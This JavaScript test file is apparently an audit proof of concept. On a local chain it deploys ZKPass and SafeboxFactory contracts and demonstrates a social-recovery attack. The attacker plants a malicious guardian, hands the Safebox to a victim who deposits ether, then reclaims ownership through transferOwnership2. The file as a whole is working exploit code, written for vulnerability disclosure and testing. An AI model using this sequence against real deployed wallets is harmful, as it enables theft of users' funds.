const { BigNumber, utils } = require("ethers");
const snarkjs = require("snarkjs");
const fs = require("fs");
const { expect } = require("chai");

const {
  abi: SafeboxContractAbi,
} = require("../artifacts/contracts/Safebox.sol/Safebox.json");

describe("Safebox Social Recover attack::", function () {
  //   let accounts;
  //   let provider;
  //   let zkPass;
  // users and accounts
  let owner, alice, attacker, maliciousGuardian, safeboxFactory, zkPass;
  let attackerSB_address, attackerSB_instance;
  let p;

  before(async function () {
    // Get SafeBoxFactory and deploy using owner.
    [owner, alice, attacker, maliciousGuardian] = await ethers.getSigners();
    console.log("owner", owner.address);
    console.log("alice", alice.address);
    console.log("attacker", attacker.address);
  });

  // Deploy ZKPass
  it("Deploy ZKPass.sol", async function () {
    const ZKPass = await ethers.getContractFactory("ZKPass");
    zkPass = await ZKPass.deploy();
    await zkPass.deployed();
    await ethers.provider.send("evm_mine", []);
    console.log("zkPass deployed:", zkPass.address);
  });
  // Deploy SafeboxFactory.sol
  it("Deploy SafeboxFactory", async function () {
    const SafeboxFactory = await ethers.getContractFactory("SafeboxFactory");
    safeboxFactory = await SafeboxFactory.deploy(zkPass.address);
    await safeboxFactory.deployed();
    await ethers.provider.send("evm_mine", []);
    console.log("safeboxFactory deployed:", safeboxFactory.address);
  });
  // Create Password for attacker in the zkpass
  it("Initialize Password for Attacker in ZKPass", async function () {
    let pwd = "abc 123";
    let nonce = "1";
    let datahash = "0";
    p = await getProof(pwd, attacker.address, nonce, datahash);

    await zkPass
      .connect(attacker)
      .resetPassword(
        p.proof,
        0,
        0,
        p.proof,
        p.pwdhash,
        p.expiration,
        p.allhash
      );
    await ethers.provider.send("evm_mine", []);
    console.log("Password for Attacker changed");
    expect(await zkPass.pwdhashOf(attacker.address)).to.eq(p.pwdhash);
  });
  // Create a Safebox for Attacker to be misused later
  it("Create SafeBox for Attacker", async function () {
    await safeboxFactory.connect(attacker).createSafebox();
    await ethers.provider.send("evm_mine", []);
    // Safebox address for Attacker
    attackerSB_address = await safeboxFactory.userToSafebox(attacker.address);
    // get contract instance for atacker Safebox
    attackerSB_instance = await ethers.getContractAt(
      SafeboxContractAbi,
      attackerSB_address,
      attacker
    );
    expect(await attackerSB_instance.owner()).to.eq(attacker.address);
    console.log("Created Safebox for Atackeer");
  });
  // Set social recover for attacker wallet
  it("Set Social Recover for Attacker SafeBox", async function () {
    // Create Proof to Set Social Recover
    const pwd = "abc 123";
    const nonce = "2";
    // const datahash = "0";
    const datahash = s(
      b(
        utils.solidityKeccak256(
          ["address[]", "uint256"],
          [[maliciousGuardian.address], 1]
        )
      )
    );

    console.log(
      "------------------------------------SEtSocial PRoff----------"
    );
    console.log(datahash);
    setSocialProof = await getProof(pwd, attacker.address, nonce, datahash);
    console.log(setSocialProof.expiration);
    console.log(setSocialProof.chainId);
    console.log(nonce);

    await attackerSB_instance
      .connect(attacker)
      .setSocialRecover(
        setSocialProof.proof,
        [maliciousGuardian.address],
        1,
        setSocialProof.expiration,
        setSocialProof.allhash
      );
    await ethers.provider.send("evm_mine", []);
    console.log("-----Attacker sets Malicious social recover guardian------");
    const socialRecover = await attackerSB_instance.getSocialRecover();
    console.log(socialRecover);
    expect(socialRecover[0].length).to.eq(1);
  });
  it("Transfer alice ownership of your Attacker's compromised Safebox", async function () {
    const pwd = "abc 123";
    const nonce = "3";
    // const datahash = "0";
    const datahash = BigNumber.from(alice.address).toBigInt().toString(10);
    transferOwnershipProof = await getProof(
      pwd,
      attacker.address,
      nonce,
      datahash
    );
    await attackerSB_instance
      .connect(attacker)
      .transferOwnership(
        transferOwnershipProof.proof,
        alice.address,
        transferOwnershipProof.expiration,
        transferOwnershipProof.allhash
      );
    await ethers.provider.send("evm_mine", []);
    console.log(
      "Attacker transfered his own ssafebox to Alice what has already guardians on it"
    );
    expect(await attackerSB_instance.owner()).to.eq(alice.address);
    // Important: Alice now has a safebox to her address and she can not create her own now.
    // So she uses the one Attacker sent her.
    // Step7: Alice transfers some eth to the safebox.
    await alice.sendTransaction({
      to: attackerSB_address,
      value: ethers.utils.parseEther("1.0"), // Sends exactly 1.0 ether
    });
    await ethers.provider.send("evm_mine", []);
    console.log("money sent by alice to safebox");
    // Final Step: Attacker transfers the owner by triggering transferOwnership2
    await attackerSB_instance
      .connect(maliciousGuardian)
      .transferOwnership2(attacker.address);
    await ethers.provider.send("evm_mine", []);
    console.log("malicious guardian transfer safebox back to attacker");
    // Now assert that attacker is the owner.
    const safeboxInstanceOwner = await attackerSB_instance.owner();
    console.log(safeboxInstanceOwner);
    console.log(attacker.address);
    expect(await attackerSB_instance.owner()).to.eq(attacker.address);
  });

  //util
  async function getProof(pwd, address, nonce, datahash) {
    let expiration = parseInt(Date.now() / 1000 + 600);
    let chainId = (await ethers.provider.getNetwork()).chainId;
    let fullhash = utils.solidityKeccak256(
      ["uint256", "uint256", "uint256", "uint256"],
      [expiration, chainId, nonce, datahash]
    );
    fullhash = s(b(fullhash).div(8)); //must be 254b, not 256b
    console.log("FUll hash in the proof creation");
    console.log(fullhash);

    let input = [stringToHex(pwd), address, fullhash];
    let data = await snarkjs.groth16.fullProve(
      { in: input },
      "./zk/v1/circuit_js/circuit.wasm",
      "./zk/v1/circuit_final.zkey"
    );

    // console.log(JSON.stringify(data))

    const vKey = JSON.parse(fs.readFileSync("./zk/v1/verification_key.json"));
    const res = await snarkjs.groth16.verify(
      vKey,
      data.publicSignals,
      data.proof
    );

    if (res === true) {
      console.log("Verification OK");

      let pwdhash = data.publicSignals[0];
      let fullhash = data.publicSignals[1];
      let allhash = data.publicSignals[2];

      let proof = [
        BigNumber.from(data.proof.pi_a[0]).toHexString(),
        BigNumber.from(data.proof.pi_a[1]).toHexString(),
        BigNumber.from(data.proof.pi_b[0][1]).toHexString(),
        BigNumber.from(data.proof.pi_b[0][0]).toHexString(),
        BigNumber.from(data.proof.pi_b[1][1]).toHexString(),
        BigNumber.from(data.proof.pi_b[1][0]).toHexString(),
        BigNumber.from(data.proof.pi_c[0]).toHexString(),
        BigNumber.from(data.proof.pi_c[1]).toHexString(),
      ];

      return {
        proof,
        pwdhash,
        address,
        expiration,
        chainId,
        nonce,
        datahash,
        fullhash,
        allhash,
      };
    } else {
      console.log("Invalid proof");
    }
  }

  function stringToHex(string) {
    let hexStr = "";
    for (let i = 0; i < string.length; i++) {
      let compact = string.charCodeAt(i).toString(16);
      hexStr += compact;
    }
    return "0x" + hexStr;
  }

  function b(num) {
    return BigNumber.from(num);
  }

  function s(bn) {
    return bn.toString();
  }
});
